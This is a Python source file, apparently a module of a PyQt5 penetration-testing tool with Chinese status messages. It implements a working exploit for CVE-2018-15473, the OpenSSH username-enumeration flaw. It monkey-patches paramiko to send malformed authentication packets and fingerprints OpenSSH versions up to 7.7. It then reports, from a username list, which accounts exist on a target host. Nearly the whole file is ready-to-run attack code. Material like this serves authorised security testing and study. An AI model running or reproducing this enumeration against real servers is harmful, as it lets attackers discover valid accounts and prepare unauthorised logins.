from PyQt5.Qt import QThread,pyqtSignal
import paramiko
import socket
import sys
import re
import queue
import threading
import plugins.config
import time

class InvalidUsername(Exception):
    """ Raise when username not found via CVE-2018-15473. """

class Ssh_username(QThread):
    str_signal = pyqtSignal([str,str])
    int_signal = pyqtSignal([int,int])
    username_queue = queue.Queue()

    def __init__(self,hostname,port,username,username_list):
        super().__init__()
        self.hostname = hostname
        self.port = port
        self.username = username
        self.username_list = username_list
        self.qsize = 0
        self.apply_monkey_patch()

    def apply_monkey_patch(self) -> None:
        """ Monkey patch paramiko to send invalid SSH2_MSG_USERAUTH_REQUEST.
            patches the following internal `AuthHandler` functions by updating the internal `_handler_table` dict
                _parse_service_accept
                _parse_userauth_failure
            _handler_table = {
                MSG_SERVICE_REQUEST: _parse_service_request,
                MSG_SERVICE_ACCEPT: _parse_service_accept,
                MSG_USERAUTH_REQUEST: _parse_userauth_request,
                MSG_USERAUTH_SUCCESS: _parse_userauth_success,
                MSG_USERAUTH_FAILURE: _parse_userauth_failure,
                MSG_USERAUTH_BANNER: _parse_userauth_banner,
                MSG_USERAUTH_INFO_REQUEST: _parse_userauth_info_request,
                MSG_USERAUTH_INFO_RESPONSE: _parse_userauth_info_response,
            }
        """

        def patched_add_boolean(*args, **kwargs):
            """ Override correct behavior of paramiko.message.Message.add_boolean, used to produce malformed packets. """

        auth_handler = paramiko.auth_handler.AuthHandler
        old_msg_service_accept = auth_handler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT]

        def patched_msg_service_accept(*args, **kwargs):
            """ Patches paramiko.message.Message.add_boolean to produce a malformed packet. """
            old_add_boolean, paramiko.message.Message.add_boolean = paramiko.message.Message.add_boolean, patched_add_boolean
            retval = old_msg_service_accept(*args, **kwargs)
            paramiko.message.Message.add_boolean = old_add_boolean
            return retval

        def patched_userauth_failure(*args, **kwargs):
            """ Called during authentication when a username is not found. """
            raise InvalidUsername(*args, **kwargs)

        auth_handler._client_handler_table.update({
            paramiko.common.MSG_SERVICE_ACCEPT: patched_msg_service_accept,
            paramiko.common.MSG_USERAUTH_FAILURE: patched_userauth_failure
        })


    def init_username_queue(self):
        try:
            if self.username_list != '':
                with open(self.username_list,'r') as f:
                    for line in f.readlines():
                        self.username_queue.put(line.strip())
            else:
                self.username_queue.put(self.username)
            self.qsize = self.username_queue.qsize()
            self.str_signal[str, str].emit('[-] 用户名列表初始化成功,共计 ' + str(self.qsize) + ' 条', 'green')
        except:
            self.str_signal[str, str].emit('[-] 用户名列表初始化失败', 'red')


    def connect(self):
        while not self.username_queue.empty():
            if plugins.config.ssh_username_wait == 0:
                username = self.username_queue.get()
                new_qsize = self.username_queue.qsize()
                try:
                    sock = socket.create_connection((self.hostname, int(self.port)))
                except socket.error as e:
                    # print(f'socket error: {e}', file=sys.stdout)
                    self.str_signal[str, str].emit('[-] ip port 连接失败', 'red')
                    return
                transport = paramiko.transport.Transport(sock)

                try:
                    transport.start_client(timeout=5)
                except paramiko.ssh_exception.SSHException:
                    self.str_signal[str, str].emit('[+] username:' + username + ' 协商失败!', 'red')
                    return
                try:
                    transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
                except paramiko.ssh_exception.AuthenticationException:
                    # print(f"[+] {Color.string(username, color='yellow')} found!")
                    self.str_signal[str, str].emit('[+] username:' + username + ' 存在!', 'red')
                except InvalidUsername:
                    # print(f'[-] {Color.string(username, color="red")} not found')
                    self.str_signal[str, str].emit('[-] username:' + username + ' 不存在', 'green')
                self.int_signal[int,int].emit(self.qsize,new_qsize)
                sock.close()
            else:
                time.sleep(1)
        self.int_signal[int, int].emit(self.qsize, 0)


    def check(self):
        try:
            sock = socket.create_connection((self.hostname, int(self.port)))
        except:
            self.str_signal[str, str].emit('[-] socket 连接创建失败.', 'red')
            return False
        banner = sock.recv(1024).decode()
        regex = re.search(r'-OpenSSH_(?P<version>\d\.\d)', banner)
        if regex:
            try:
                version = float(regex.group('version'))
            except ValueError:
                self.str_signal[str,str].emit('[-] 尝试进行版本识别,无法识别版本','red')
                self.str_signal[str, str].emit(f'[-] 发现{regex.group("version")}', 'red')
                return False
                # print(f'[!] Attempted OpenSSH version detection; version not recognized.\n[!] Found: {regex.group("version")}')
            else:
                ver_clr = 'green' if version <= 7.7 else 'red'
                # print(f"[+] {Color.string('OpenSSH', color=ver_clr)} version {Color.string(version,color=ver_clr)} found")
                self.str_signal[str, str].emit(f'[+] OpenSSH version ' + str(version), ver_clr)
                if ver_clr == 'green':
                    return True
                else:
                    return False
        else:
            self.str_signal[str, str].emit('[-] 尝试进行版本识别,无法识别版本', 'red')
            self.str_signal[str, str].emit('[-] 发现' + banner, 'red')
            return False
            # print(f'[!] Attempted OpenSSH version detection; version not recognized.\n[!] Found: {Color.string(banner,color="yellow")}')

    def run(self):
        if self.check():
            self.init_username_queue()
            self.connect()
        else:
            return